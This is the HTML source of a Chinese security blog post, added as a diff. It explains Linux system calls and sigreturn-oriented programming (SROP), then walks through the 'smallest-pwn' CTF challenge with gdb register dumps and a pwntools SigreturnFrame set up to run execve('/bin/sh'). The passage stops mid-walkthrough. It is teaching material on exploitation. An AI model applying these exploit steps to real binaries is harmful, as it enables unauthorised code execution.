@@ -1,0 +1,1479 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="二进制安全,pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="拥抱生命里的巨浪惊涛，迎接风雨中几许争斗">
+<meta name="keywords" content="二进制安全,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FramingSignals-AReturntoPortableShellcode(SROP)">
+<meta property="og:url" content="http://1234xxh.github.io/2020/12/22/1/index.html">
+<meta property="og:site_name" content="sh0wmak3r&#39;s Blog">
+<meta property="og:description" content="拥抱生命里的巨浪惊涛，迎接风雨中几许争斗">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/19.jpeg">
+<meta property="og:image" content="http://1234xxh.github.io/image/20201222/image1.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20201222/image2.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20201222/image3.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20201222/image4.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20201222/image5.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20201222/image6.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20201222/image7.png">
+<meta property="og:updated_time" content="2020-12-22T14:38:22.907Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="FramingSignals-AReturntoPortableShellcode(SROP)">
+<meta name="twitter:description" content="拥抱生命里的巨浪惊涛，迎接风雨中几许争斗">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/19.jpeg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1234xxh.github.io/2020/12/22/1/"/>
+
+
+
+
+
+  <title>FramingSignals-AReturntoPortableShellcode(SROP) | sh0wmak3r's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <!-- <div class="headband"></div> -->
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sh0wmak3r's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">safe | smart contract | binary</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/12/22/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bey0ndm3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/background.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sh0wmak3r's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">FramingSignals-AReturntoPortableShellcode(SROP)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-22T20:25:13+08:00">
+                2020-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/12/22/1/" class="leancloud_visitors" data-flag-title="FramingSignals-AReturntoPortableShellcode(SROP)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>拥抱生命里的巨浪惊涛，迎接风雨中几许争斗</p>
+<p><img src="/image/N2LL/19.jpeg" alt="image"><br><a id="more"></a></p>
+<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>先更新一部分srop，ret2vdso后续更新</p>
+<h1 id="0x02-背景知识"><a href="#0x02-背景知识" class="headerlink" title="0x02 背景知识"></a>0x02 背景知识</h1><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><blockquote>
+<h3 id="什么是系统调用"><a href="#什么是系统调用" class="headerlink" title="什么是系统调用"></a>什么是系统调用</h3></blockquote>
+<p>一般的把操作系统的进程空间分为用户空间（user space）与内核空间（kernel space），我们在执行某些操作的时候会在从用户空间切换到内核空间，比如在程序调用到 open、for、read、write 等函数时。那么空间的切换需要一个通道，或者说一个载体，这就是就是系统调用。<br>系统调用是程序进入内核以执行某些任务的方式。程序使用系统调用来执行各种操作，例如：创建进程，执行网络和文件IO等，系统调用在这些操作过程中作为沟通用户空间与内核空间的桥梁存在。<br>在x86-64 CPU中有称为特权等级的概念，在<a href="https://en.wikipedia.org/wiki/Protection_ring" target="_blank" rel="noopener">wiki</a>中给出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer operating systems provide different levels of access to resources. A protection ring is one of two or more hierarchical levels or layers of privilege within the architecture of a computer system.</span><br></pre></td></tr></table></figure></p>
+<p>简单来说，特权级别是一种保护机制，是权限控制的一种方式。<br>它分为4 个等级，分别是ring 0 - ring 3，用户空间代码运行在 ring 3，内核空间代码运行在 ring 0，其中在大多数操作系统中，ring 0 是具有最高特权的级别，并且与物理硬件（例如CPU和内存）进行直接交互。<br>计算机会根据等级来判断是否可以对此资源进行访问，所以程序需要进行系统调用来执行各种操作。</p>
+<h3 id="系统调用种类"><a href="#系统调用种类" class="headerlink" title="系统调用种类"></a>系统调用种类</h3><blockquote>
+<h4 id="传统系统调用"><a href="#传统系统调用" class="headerlink" title="传统系统调用"></a>传统系统调用</h4></blockquote>
+<p>Linux 内核预留了一个特殊的软中断号128 (0x80)，用户空间程序使用它可以进入内核执行系统调用，对应的中断处理函数是ia32_syscall。而int 指令可以产生软中断，然后软中断触发内核执行，这就是传统的系统调用接口。<br>那么是怎么执行的？<br>从 trap_init 函数开始，通过set_system_intr_gate(IA32_SYSCALL_VECTOR, ia32_syscall)(其中 IA32_SYSCALL_VECTOR 为 0x80，ia32_syscall用来注册的一个内核注册了一个系统调用回调函数）然后调用ia32_sys_call_table这个一个中断号列表实现真正的系统调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/kernel/traps.c：</span><br><span class="line">void __init trap_init(void)&#123;</span><br><span class="line">        set_system_intr_gate(IA32_SYSCALL_VECTOR, ia32_syscall);</span><br><span class="line"></span><br><span class="line">arch/x86/ia32/ia32entry.S ：</span><br><span class="line">ia32_do_call:</span><br><span class="line">        IA32_ARG_FIXUP</span><br><span class="line">        call *ia32_sys_call_table(,%rax,8) # xxx: rip relative</span><br><span class="line"></span><br><span class="line">arch/x86/ia32/syscall_ia32.c：</span><br><span class="line">const sys_call_ptr_t ia32_sys_call_table[__NR_ia32_syscall_max+1] = &#123;</span><br><span class="line">        [0 ... __NR_ia32_syscall_max] = &amp;compat_ni_syscall,</span><br></pre></td></tr></table></figure></p>
+<p>另外对这个过程做了规定，eax中存放系统调用的值，具体系统调用表请见<a href="http://man7.org/linux/man-pages/man2/syscalls.2.html" target="_blank" rel="noopener">syscall man page</a>。这样就通过执行int 0x80，根据eax的值来触发不同系统调用。<br>特别的，在系统调用之前需要保存现场，系统调用后需要恢复现场。通常的执行转交给 ia32_syscall 时会发生特权级别切换，其结果是进入 ia32_syscall 时的需要保存上下文到栈中。返回地址、包含特权级别的 CPU flags 以及其他一些参数都在 ia32_syscall 执行之前压入栈顶。所以，结束时需要恢复上下文，内核只需要将这些值从栈里复制回它们原来所在的寄存器，程序就可以回到用户空间继续执行，其中最简单的做法是通过 iret 指令，Intel 指令集手册解释说 iret 指令从栈上依次 pop 返回地址和保存的寄存器值。</p>
+<blockquote>
+<h4 id="快速系统调用"><a href="#快速系统调用" class="headerlink" title="快速系统调用"></a>快速系统调用</h4></blockquote>
+<p>快速系统调用分为<br>在 32bit 系统上：使用 sysenter 和 sysexit<br>在 64bit 系统上：使用 syscall 和 sysret<br>刚才说到，Linux下传统的系统调用是通过软中断(0x80)实现的，但是采用传统的int 0x80的系统调用浪费了很多时间，int 0x80 做了更多的工作，导致了 CPU 的流水线中断，从而带来了额外的开销，所以速度很慢，而fast system call可以弥补这个缺点，所以才最终决定在linux内核中用后者都替换前者（最终在2.6版本的内核中才加入了此功能）。<br>如何用替换fast system call方式替换以前的int 0x80呢？linux 内核需要考虑到这点：有的机器并不支持fast system call方式，于是需要在glibc确定，进行系统调用的时候就从内核给的这个地址调用，这个地址指向的内容要么是int 0x80调用方式，要么是fast system call方式调用方式，内核会根据机器来选择其中一个，这样一来kernel与glibc的实现了完美的到配合，而这个地址便是vsyscall的首地址，后面会说到。<br>先来看下32bit下的fast system call，由于需要 glibc和内核之间的协作，为了使 sysenter 能够接收到系统调用请求，内核必须设置 3 个 MSR：A32_SYSENTER_EIP、 IA32_SYSENTER_CS 、IA32_SYSENTER_ESP ，其中内核将回调函数地址放入 IA32_SYSENTER_EIP中 ，当 sysenter 指令执行的时候，就触发调用相应的回调函数。<br>和传统软中断系统调用类似，使用 sysenter 创建快速系统调用时也需要一个约定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* 32bit SYSENTER instruction entry.</span><br><span class="line"> *</span><br><span class="line"> * Arguments:</span><br><span class="line"> * %eax System call number.</span><br><span class="line"> * %ebx Arg1</span><br><span class="line"> * %ecx Arg2</span><br><span class="line"> * %edx Arg3</span><br><span class="line"> * %esi Arg4</span><br><span class="line"> * %edi Arg5</span><br><span class="line"> * %ebp user stack</span><br><span class="line"> * 0(%ebp) Arg6</span><br></pre></td></tr></table></figure></p>
+<p>进行sysenter系统调用时，因为内核和它的进出系统调用的约定随着时间在变，最终你的代码会变得不可用，一般通过内核函数 __kernel_vsyscall进行，它内部封装了 sysenter 调用约定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__kernel_vsyscall:</span><br><span class="line">.LSTART_vsyscall:</span><br><span class="line">        push %ecx</span><br><span class="line">.Lpush_ecx:</span><br><span class="line">        push %edx</span><br><span class="line">.Lpush_edx:</span><br><span class="line">        push %ebp</span><br><span class="line">.Lenter_kernel:</span><br><span class="line">        movl %esp,%ebp</span><br><span class="line">        sysenter</span><br></pre></td></tr></table></figure></p>
+<p>和传统系统调用一样，依然是注册一个回调函数，然后用系统调用编号作为索引去 ia32_sys_call_table 列表查找，相应的iret的对应指令是sysexit 指令，用来恢复用户程序的执行。<br>64bit下也是一样的，要使内核接收系统调用请求，必须将对应的回调函数地址写到 LSTAR MSR，system_call会调用sys_call_table实现系统调用，然后sysret 指令将执行过程返还给用户程序，以上这两个过程之中也要进行保存和恢复上下文，具体可见<a href="https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/" target="_blank" rel="noopener">the-definitive-guide-to-linux-system-calls</a>。大体了解完后，我们会发现软件中断可以实现系统调用，eax/rax值绝对执行哪一种系统调用，另外重要的是这都要涉及到现场保存和恢复问题。</p>
+<h1 id="0x03-srop"><a href="#0x03-srop" class="headerlink" title="0x03 srop"></a>0x03 srop</h1><blockquote>
+<h2 id="什么是srop"><a href="#什么是srop" class="headerlink" title="什么是srop"></a>什么是srop</h2></blockquote>
+<p>SROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究<a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="noopener">Framing Signals — A Return to Portable Shellcode</a>发表在安全顶级会议 Oakland 2014 上。<br>刚才已经了解了系统调用，我们知道一般触发方式就是中断，srop就是利用这一机制进行操作。<br>我们先看一下中断的步骤<br><img src="/image/20201222/image1.png" alt="image"></p>
+<p>发起中断后，程序会从用户空间转移到内核空间，经过了解我们知道当发生中断的时候，在执行回调函数之前，需要将程序此时的状态和内容进行存储，也就是保护现场（在第一部分提到），主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。<br><img src="/image/20201222/image2.png" alt="image"></p>
+<p>在论文中作者也给出；<br><img src="/image/20201222/image3.png" alt="image"></p>
+<p>其中上图中压入的寄存器值也就是ucontext和 siginfo这一段为 Signal Frame。<br>当保存完上下文信息后，程序控制权交给signal handler进行处理，直到处理结束，此时程序需要继续运行。<br>既然原来的程序继续执行，那么应该从中断前的点为出发点，就得将在stack保存的信息进行恢复，怎么样去恢复呢？程序就会执行sigreturn 系统调用，因为栈中已经保存了 sigreturn的地址。<br>那么我们就看一下sigreturn 系统调用会发生什么？<br>执行sigreturn的操作如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*for x86*/</span><br><span class="line">    mov eax,0x77</span><br><span class="line">    int 80h</span><br><span class="line">/*for x86_64*/</span><br><span class="line">    mov rax,0xf</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></p>
+<p>执行sigreturn 系统调用，上下文恢复程序就可以接着去执行。<br>看似很完美，但是却忽视了一个问题。<br>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的，而且由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，也就是中断结束后恢复的Signal Frame和中断开始时保存的Signal Frame是否是一致的不会去检查，即使用户对Signal Frame进行修改，也会正常执行 sigreturn 系统调用，将寄存器信息进行恢复。拥有以上两个条件，用户就可以控制程序的执行，srop也就是出现了。</p>
+<blockquote>
+<h2 id="怎么样srop"><a href="#怎么样srop" class="headerlink" title="怎么样srop"></a>怎么样srop</h2></blockquote>
+<p>就像刚才说到的用户可以对Signal Frame进行修改并通过执行 sigreturn 系统调用控制寄存器。<br><img src="/image/20201222/image4.png" alt="image"></p>
+<p>以x86的为例子，sigreturn 系统调用后，把伪造的sigframe进行恢复，如果我们构造execve(‘/bin/sh‘,null,null)的寄存器信息，那么恢复完后，继续执行int 0x80，执行execve(‘/bin/sh‘,null,null)获得权限。<br>下面通过一个360春秋杯中的题目smallest-pwn深入了解一下怎么去利用srop进行getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x4000b0:    xor    rax,rax</span><br><span class="line">0x4000b3:    mov    edx,0x400</span><br><span class="line">0x4000b8:    mov    rsi,rsp</span><br><span class="line">0x4000bb:    mov    rdi,rax</span><br><span class="line">0x4000be:    syscall </span><br><span class="line">0x4000c0:    ret</span><br></pre></td></tr></table></figure></p>
+<p>简单分析一下<br>xor    rax,rax后 rax == 0x0<br>mov    edx,0x400后 rdx == 0x400<br>mov    rsi,rsp后 rsi == 此时栈顶的值<br>mov    rdi,rax后 rdi == 0x0<br>最后syscall 执行系统调用，注意此时rax == 0x0 会调用read函数进行读取数据。<br>可以发现read(rdi，rsi， rdx)就是想栈读入0x400个字节<br>动态调试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x0 </span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x7fffffffcdc0 --&gt; 0x1 </span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7fffffffcdc0 --&gt; 0x1 </span><br><span class="line">RIP: 0x4000be (syscall)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4000b2:    sar    BYTE PTR [rdx+0x400],0x48</span><br><span class="line">   0x4000b9:    mov    esi,esp</span><br><span class="line">   0x4000bb:    mov    rdi,rax</span><br><span class="line">=&gt; 0x4000be:    syscall </span><br><span class="line">   0x4000c0:    ret    </span><br><span class="line">   0x4000c1:    add    BYTE PTR [rsi],ch</span><br><span class="line">   0x4000c3:    jae    0x40012d</span><br><span class="line">   0x4000c5:    jae    0x40013b</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x0 </span><br><span class="line">arg[1]: 0x7fffffffcdc0 --&gt; 0x1 </span><br><span class="line">arg[2]: 0x400 </span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffcdc0 --&gt; 0x1</span><br></pre></td></tr></table></figure></p>
+<p>可以发现就是read(0，&amp;rsp， 0x400)<br>那么我们怎么去利用？<br>很显然0x400完全足够读入一个sigreturn Frame，那么我们就可以进行构造了<br>那么针对x64位要执行execve(‘/bin/sh’,0,0)需要有什么前提条件？<br>首先rax 为0xb，其次rdi 为’/bin/sh’的addr，最后rip指向syscall的地址。然后程序进行执行，这样才会execve(‘/bin/sh’,0,0)<br>那么怎么使得这些寄存器是这样的布置？<br>那么需要sigreturn Frame构造，然后执行sigreturn即可布置寄存器的值<br>构造一下sigreturn Frame<br>frame =  SigreturnFrame(kernel=”amd64”)<br>frame.rax = constants.SYS_execve<br>frame.rdi = binsh_addr<br>frame.rsi = 0<br>frame.rdx = 0<br>frame.rip = sigreturn_addr<br>执行sigreturn后，就会把寄存器是这样的布置好，进而执行execve(‘/bin/sh’,0,0)<br>但是此题来说，找不到sigreturn的gadget，只能去构造sigreturn；也找不到/bin/sh，需要去写入；另外如果完成execve(‘/bin/sh’,0,0)的frame构造还需要一个已知的栈地址。<br>一顿分析后，思路应该是这样：<br>能不能在某一个地址写入如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">| ----------------- |</span><br><span class="line">|   syscall_addr    | 0xX</span><br><span class="line">| ----------------- |</span><br><span class="line">|       Frame       |</span><br><span class="line">|      rdi=0xY      |</span><br><span class="line">| ----------------- |</span><br><span class="line">|        Frame      |</span><br><span class="line">|       rsi=0x0     |</span><br><span class="line">| ----------------- |</span><br><span class="line">|        Frame      |</span><br><span class="line">|       rdx=0x0     |</span><br><span class="line">| ----------------- |</span><br><span class="line">|        Frame      |</span><br><span class="line">|  rip=syscall_addr |</span><br><span class="line">| ----------------- |</span><br><span class="line">|        Frame      |</span><br><span class="line">|        ......     |</span><br><span class="line">| ----------------- |</span><br><span class="line">|       /bin/sh     | 0xX+N = 0xY</span><br><span class="line">| ----------------- |</span><br></pre></td></tr></table></figure></p>
+<p>只需要让rip指向0xX的syscall_addr，那么就可以execve(‘/bin/sh’,0,0)<br>如想实现上一步的操作，我们最好是read这个庞然大物到一个已知的地址（0xX）处，因为我们需要在faker  frame设置rdi的值：0xY=0xX+N，必须获得一个已知的栈地址才能构造，然后将0xX的syscall_addr读入rip，使得faker frame恢复。<br>如想实现上一步，我们需要知道一个stack_addr（0xX），使用write函数去泄漏；还要构造一个read函数，read(0, 0xX , 0x400)将shellcode写入。<br>看着很合理，下面就开始一步一步实现</p>
+<p><strong> 第一步：泄漏栈地址 </strong><br>上面分析到，我们需构造一个read函数，还需要构造一个write函数，那么不妨先多写几个程序首地址进行循环，这里写入三个0x4000b0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x18 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x4000c0 (ret)</span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x7ffe2634a5f0 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7ffe2634a5f0 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">RIP: 0x4000c0 (ret)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4000b9:    mov    esi,esp</span><br><span class="line">   0x4000bb:    mov    rdi,rax</span><br><span class="line">   0x4000be:    syscall </span><br><span class="line">=&gt; 0x4000c0:    ret    </span><br><span class="line">   0x4000c1:    add    BYTE PTR [rsi],ch</span><br><span class="line">   0x4000c3:    jae    0x40012d</span><br><span class="line">   0x4000c5:    jae    0x40013b</span><br><span class="line">   0x4000c7:    jb     0x40013d</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffe2634a5f0 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">0008| 0x7ffe2634a5f8 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">0016| 0x7ffe2634a600 --&gt; 0x4000b0 (xor    rax,rax)</span><br></pre></td></tr></table></figure></p>
+<p>然后就是构造一个write函数：write(1, addr, 0x400)。使用系统调用去执行write函数，我们知道write函数调用号是1，那么rax需要设置为1，另外第一个参数rdi也要是1。<br>怎么去构造？<br>首先我们得了解一个知识点，RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数，因此我们可以使得read一个字节来进行控制rax的值，恰好程序中会把rax赋值给rdi。但是在程序中，由于xor    rax,rax执行，rax始终为0，我们只需要跳过 0x4000b0，去执行0x4000b3。具体的操作办法就是在执行read函数时，读入一个\xb3字节即可完成以上工作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x1 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x4000c0 (ret)</span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x7ffe2634a5f8 --&gt; 0x4000b3 (mov    edx,0x400)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x0 </span><br><span 